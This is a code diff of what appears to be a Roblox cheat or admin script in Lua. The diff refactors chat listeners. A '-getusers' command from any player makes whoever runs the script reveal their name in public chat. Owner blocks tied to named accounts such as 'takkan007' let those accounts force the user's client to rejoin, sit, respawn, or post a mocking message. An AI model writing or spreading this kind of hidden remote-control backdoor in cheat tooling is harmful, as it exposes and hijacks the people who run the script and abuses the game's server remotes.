@@ -4587,64 +4587,25 @@ getgenv().DisableAstheticAdmin = function()
 	end)
 end
 
-if ReScript then
-PublicPrefix = "-"
+local LPlayer = game.Players.LocalPlayer
+local Players = game.Players
+local Replicate = game:GetService("ReplicatedStorage")
+local PuPrefix = "-"
 
-for i,v in pairs(game.Players:GetPlayers()) do
-local Users = v
-Users.Chatted:Connect(function(tk)
-if string.sub(tk, 1, 9) == (PublicPrefix.."getusers") then
-local NickName = game.Players.LocalPlayer.Name
-game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(NickName, "All")
-end
-if string.sub(tk, 1, 7) == (PublicPrefix.."reload") then
-ReScript = false
-NotReScript = false
-ReScript2 = true
+Players.PlayerAdded:Connect(function(v)
+v.Chatted:Connect(function(Msg)
+if string.sub(Msg, 1, 9) == (PuPrefix.."getusers") then
+Replicate.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(LPlayer.Name, "All")
 end
 end)
-end
-end
+end)
 
-if ReScript2 then
-PublicPrefix = "-"
-
-for i,v in pairs(game.Players:GetPlayers()) do
-local Users = v
-Users.Chatted:Connect(function(tk)
-if string.sub(tk, 1, 9) == (PublicPrefix.."getusers") then
-local NickName = game.Players.LocalPlayer.Name
-game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(NickName, "All")
-end
-if string.sub(tk, 1, 7) == (PublicPrefix.."reload") then
-ReScript = false
-NotReScript = true
-ReScript2 = false
+for i,v in pairs(Players:GetPlayers()) do
+v.Chatted:Connect(function(Msg)
+if string.sub(Msg, 1, 9) == (PuPrefix.."getusers") then
+Replicate.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(LPlayer.Name, "All")
 end
 end)
-end
-end
-
-NotReScript = true
-if NotReScript then
-ReScript = false
-
-PublicPrefix = "-"
-
-for i,v in pairs(game.Players:GetPlayers()) do
-local Users = v
-Users.Chatted:Connect(function(tk)
-if string.sub(tk, 1, 9) == (PublicPrefix.."getusers") then
-local NickName = game.Players.LocalPlayer.Name
-game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(NickName, "All")
-end
-if string.sub(tk, 1, 7) == (PublicPrefix.."reload") then
-ReScript = true
-NotReScript = false
-ReScript2 = false
-end
-end)
-end
 end
 
 function OwnerCmds()
@@ -4815,14 +4776,14 @@ local Owner2 = game.Players:FindFirstChild("takkan007")
 if Owner1 then
 Owner1.Chatted:Connect(function(tk)
 if string.sub(tk, 1, 7) == (OwnPrefix.."rejoin") then
-game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players.LocalPlayer)
+game:GetService("TeleportService"):Teleport(game.PlaceId, LPlayer)
 end
 if string.sub(tk, 1, 4) == (OwnPrefix.."msg") then
-game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("i am yag", "All")
+Replicate.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("i am yag", "All")
 end
 if string.sub(tk, 1, 9) == (OwnPrefix.."getusers") then
-local NickName = game.Players.LocalPlayer.Name
-game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(NickName, "All")
+local NickName = LPlayer.Name
+Replicate.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(NickName, "All")
 end
 if string.sub(tk, 1, 5) == (OwnPrefix.."cmds") then
 OwnerCmds()
@@ -4840,10 +4801,10 @@ if string.sub(tk, 1, 4) == (OwnPrefix.."sit") then
 game.Players.LocalPlayer.Character.Humanoid.Sit = true
 end
 if string.sub(tk, 1, 8) == (OwnPrefix.."respawn") then
-local savedcf = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+local savedcf = LPlayer.Character.HumanoidRootPart.CFrame
 local savedcamcf = workspace.CurrentCamera.CFrame
 workspace.Remote.loadchar:InvokeServer() 
-game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
+LPlayer.Character.HumanoidRootPart.CFrame = savedcf
 workspace.CurrentCamera.CFrame = savedcamcf
 end
 if string.sub(tk, 1, 14) == (OwnPrefix.."abuser notify") then
@@ -4858,11 +4819,11 @@ if string.sub(tk, 1, 7) == (OwnPrefix.."rejoin") then
 game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players.LocalPlayer)
 end
 if string.sub(tk, 1, 4) == (OwnPrefix.."msg") then
-game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("i am yag", "All")
+Replicate.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("i am yag", "All")
 end
 if string.sub(tk, 1, 9) == (OwnPrefix.."getusers") then
-local NickName = game.Players.LocalPlayer.Name
-game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(NickName, "All")
+local NickName = LPlayer.Name
+Replicate.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(NickName, "All")
 end
 if string.sub(tk, 1, 5) == (OwnPrefix.."cmds") then
 OwnerCmds()
@@ -4880,10 +4841,10 @@ if string.sub(tk, 1, 4) == (OwnPrefix.."sit") then
 game.Players.LocalPlayer.Character.Humanoid.Sit = true
 end
 if string.sub(tk, 1, 8) == (OwnPrefix.."respawn") then
-local savedcf = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+local savedcf = LPlayer.Character.HumanoidRootPart.CFrame
 local savedcamcf = workspace.CurrentCamera.CFrame
 workspace.Remote.loadchar:InvokeServer() 
-game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
+LPlayer.Character.HumanoidRootPart.CFrame = savedcf
 workspace.CurrentCamera.CFrame = savedcamcf
 end
 if string.sub(tk, 1, 14) == (OwnPrefix.."abuser notify") then
